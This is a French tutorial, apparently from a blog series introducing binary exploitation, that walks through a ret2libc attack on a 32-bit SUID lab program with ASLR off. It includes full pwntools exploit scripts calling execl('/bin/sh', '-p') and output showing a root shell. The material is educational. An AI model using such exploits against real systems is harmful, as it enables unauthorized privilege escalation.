---
title: Partie 9 - Exploiter un BO - attaque ret2libc – mise en œuvre pratique (2/2)
date: 2026-04-30 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Exploiter un *stack buffer overflow* : attaque *ret2libc* – mise en œuvre pratique (2/2)

## Exploitation - suite

Précédemment, nous avons énuméré les différentes possibilités offertes par la **libc** en termes de fonctions que nous pouvons utiliser pour ouvrir un terminal. Après en avoir comparé quelques-unes, nous avons opté pour `execl`. 

Là encore, nous avons le choix dans les arguments à utiliser :

- `execl("/bin/sh", "/bin/sh", "-p", NULL)` ;
- `execl("/tmp/wrapper", "/tmp/wrapper", NULL)` ;
- `execl("/usr/bin/python3", "/usr/bin/python3", NULL)`.

Je vous propose d'utiliser la version avec `/bin/sh -p` car, bien qu'il y ait besoin d'un argument supplémentaire, cette méthode est celle qui nécessite le moins d'hypothèses :

- pas besoin d'avoir accès à la machine cible pour y écrire un *wrapper* ;
- pas besoin de savoir où est installé Python.

### Le fonctionnement de ret2libc

Rentrons dans le vif du sujet : comment utiliser concrètement la méthode **ret2libc** pour appeler `execl("/bin/sh", "/bin/sh", "-p", NULL)` ?

Cette question soulève **deux questions sous-jacentes** :

1. Où se trouve `execl` ?
2. Comment donner les bons arguments à `execl` ?

Pour ce qui est de l'adresse de `execl`, lorsque **gdb** est ouvert, il suffit d'afficher l'adresse de la fonction avec `p *execl`, ce qui donne (dans mon cas) : `$1 = {int (const char *, const char *, ...)} 0xf7e689e0 <__GI_execl>`. Comme l'ASLR est désactivée, cette adresse sera la même d'une exécution à une autre : notez-la dans une variable : `ADDR_EXECL = 0xf7e689e0`.

Bien, maintenant attaquons-nous **aux arguments**. Pour rappel, en 32 bits les arguments sont transmis de cette manière :

![](/assets/images/introduction_au_pwn/args_vars.png)

> Les adresses de ce schéma sont utilisées à titre indicatif.
{: .prompt-tip }

> Il suffit donc de mettre les arguments dans le *payload* juste après la valeur modifiée de l'adresse de retour, non ?
{: .prompt-info }

Presque, à un détail près 🤏. En fait, si on insère les données telles qu'elles sont dans le schéma ci-dessus (`adresse de retour`, `arg_1`,`arg_2`...) il va y avoir un souci. Le problème réside dans la manière d'entrer dans `execl`.

En effet, en temps normal, c'est une instruction du type `call execl` qui est exécutée. Cette instruction est équivalente à `push addr_retour ; jmp execl`. Ainsi, la première valeur sur la pile lorsque l'on rentre dans `execl` doit être l'adresse de retour, c'est-à-dire l'adresse à laquelle le processeur retourne en fin de fonction lors de l'exécution de `ret`.

La charge utile doit donc, en fin de compte, avoir cette forme à la sortie de `main` :

![](/assets/images/introduction_au_pwn/2_adrr_ret.png)

Avec :

- **Adresse de retour n°1** 🔴 : c'est l'adresse de retour du `main` que l'on écrase en premier afin d'y écrire l'adresse de `execl` pour y sauter ;
- **Adresse de retour n°2** 🟡 : ce sera l'adresse de retour de la fonction que l'on souhaite exécuter (en l'occurrence `execl`). C'est-à-dire que cette adresse de retour doit contenir l'adresse de la fonction que l'on souhaite exécuter après être sorti de `execl`.

De cette manière, en entrant dans `execl`, la première valeur sur la pile sera bien l'adresse de retour 🟡. La pile aura donc la forme attendue par le processeur. Nous sommes contraints à utiliser deux adresses de retour de suite car nous n'appelons pas `execl` avec une instruction `call`. Gardez bien en tête la raison de la contrainte et comment y remédier : cela nous sera **très utile** dans d'autres **méthodes d'exploitation** 😉. 

### L'écriture du payload

Après la théorie, place à la pratique !

Nous contrôlons `eip` et nous avons noté l'adresse de `execl`. Quelle deuxième adresse de retour utiliser ?

Tout d'abord, sachez qu'il **n'est pas nécessaire qu'elle soit valide**. En effet, le *shell* sera ouvert avant que l'on sorte de `execl`. Nous aurons donc le temps de faire tout ce que l'on souhaite avant que `execl` finisse son exécution. Ainsi, même si le programme plante car l'adresse de retour de `execl` n'est pas valide, cela n'est pas si gênant pour nous. Mais essayons tout de même de faire quelque chose de carré 😎.

Je vous propose donc d'utiliser la fonction `exit` de la **libc** qui prend en argument le code d'erreur. L'argument en soi n'est pas très important, ce qui nous intéresse, c'est de terminer proprement l'exécution du processus 😇. Voici donc l'allure de la pile que nous souhaitons avoir lors du `ret` du `main` afin d'appeler `execl("/bin/sh", "/bin/sh", "-p", NULL)`:

![](/assets/images/introduction_au_pwn/pload_execl.png)

Pour récupérer l'adresse de `exit` dans **gdb**, vous savez comment faire 😏. Pour ma part, l'adresse de `exit` est `0xf7da4460`. Pour les chaînes de caractères `"/bin/sh"` et `"-p"`, comme l'ASLR est désactivée nous savons où l'entrée utilisateur est stockée sur la pile. Nous pouvons donc **utiliser l'entrée utilisateur** comme nous l'avions fait précédemment pour stocker ces deux chaînes de caractères. 

> Comme le programme est SUID, il vaut mieux réaliser **un débogage à la volée** afin d'être sûr d'avoir les bonnes adresses pour `"/bin/sh"` et `"-p"`. Sinon, vous risquerez de perdre du temps car le *payload* final ne fonctionnera pas à cause de mauvaises adresses de pile.
{: .prompt-warning }

Ce qui donne dans notre script :

```python
from pwn import *

ADDR_EXECL = 0xf7e689e0      # a adapter si besoin
ADDR_EXIT = 0xf7dc75b0       # a adapter si besoin
ADDR_BIN_SH = 0xdeadbeef     # a determiner
ADDR_ARG_P = 0xcafebabe      # a determiner

io = process("./ret2libc")

payload = b"/bin/sh\x00"
payload += b"-p\x00"
payload += b"A" * (268-len(payload))
payload += p32(ADDR_EXECL)   # adresse de retour du main
payload += p32(ADDR_EXIT)    # adresse de retour de execl
payload += p32(ADDR_BIN_SH)  # programme a executer
payload += p32(ADDR_BIN_SH)  # premier argument
payload += p32(ADDR_ARG_P)   # deuxieme argument
payload += p32(0)            # dernier argument nul

gdb.attach(io, '''
b *0x804921f
continue
''')

io.sendline(payload)

io.interactive()
```

> N'oublions pas que les chaînes de caractères doivent toujours être terminées par `0x00` en C.
{: .prompt-tip }

Il ne nous manque plus que l'adresse de `"/bin/sh"` et de `"-p"`. Pour ne pas avoir de décalage dû aux variables d'environnement, nous allons réutiliser le même *wrapper* que nous avions utilisé lors du précédent chapitre. Je plaisante,  **pwntools** va le faire pour nous 🤩! Il suffit d'ajouter le paramètre suivant lors du lancement du processus : `io = process("./ret2libc", env={})`.

Lançons le script et constatez par vous-même l'absence des variables d'environnement :

![](/assets/images/introduction_au_pwn/novarenv.png)

En tâtonnant un peu pour trouver où se trouvent les deux chaînes de caractères, on tombe sur ceci :

```
x/2s $esp - 0x10c
0xffffdd30:	"/bin/sh"
0xffffdd38:	"-p"
```

Nous avons nos deux adresses manquantes (même si les vôtres sont sans doute **différentes**). Remplaçons-les dans notre script :

```python
from pwn import *

ADDR_EXECL = 0xf7e689e0      # a adapter si besoin
ADDR_EXIT = 0xf7dc75b0       # a adapter si besoin
ADDR_BIN_SH = 0xffffdd30     # a adapter si besoin
ADDR_ARG_P = 0xffffdd38      # a adapter si besoin

io = process("./ret2libc", env={})

payload = b"/bin/sh\x00"
payload += b"-p\x00"
payload += b"A" * (268-len(payload))
payload += p32(ADDR_EXECL)
payload += p32(ADDR_EXIT)
payload += p32(ADDR_BIN_SH)
payload += p32(ADDR_BIN_SH)
payload += p32(ADDR_ARG_P)
payload += p32(0)

# plus besoin de gdb

io.sendline(payload)

io.interactive()
```

> N'oubliez pas d'adapter les différentes adresses avec ce que vous avez trouvé de votre côté sinon l'exploit ne fonctionnera pas.
{: .prompt-warning }

En lançant le script, nous avons bien un terminal qui s'ouvre ! Et comme le programme est SUID, on est bien `root` !

```
python3 script.py
[+] Starting local process './ret2libc': pid 198754  
[*] Switching to interactive mode  
Bonjour /bin/sh !  
$ whoami  
root  
$    
[*] Interrupted  
[*] Stopped process './ret2libc' (pid 198754)
```

![](/assets/images/introduction_au_pwn/root.gif)

Voilà ! C'était plus rapide que la dernière fois, non 😎 ?

## 📝 Exercice

**Adapter le script** afin d'exploiter le programme en utilisant `execl("/usr/bin/python3", "/usr/bin/python3", NULL)`.

## 📋 Synthèse

Finalement, **ret2libc** est une méthode d'exploitation des **dépassements de mémoire** assez simple à mettre en œuvre car nous avons déjà passé pas mal de temps à comprendre les problématiques liées au **SUID**, **l'ASLR**, les **variables d'environnement** et l'**argument** `-p` de `/bin/sh`.

Cette méthode est utilisable dans le **contexte suivant** :

- l'**ASLR** est **désactivée** ;
- la **pile n'est pas exécutable**.

Vous l'aurez compris, lorsque l'**ASLR** est **activée**, il sera plus compliqué de déployer cette méthode sans pour autant être impossible : en utilisant de potentielles **fuites d'informations** (*leaks* 🇬🇧) il sera possible de contourner l'aléatoirisation de la mémoire.

Il y a une autre contrainte de cette technique dont nous n'avons pas parlé jusque-là :

- le programme doit être **en 32 bits**

En effet, si le programme est en **64 bits**, les premiers arguments ne sont plus passés par **la pile** mais via **les registres**. Il sera donc nécessaire de trouver une astuce pour pouvoir **charger les registres** en exploitant le dépassement sur la pile. Une des techniques pour y parvenir est le **ROP** (**R**eturn-**O**riented **P**rogramming) dont on aura l'occasion de parler en profondeur par la suite.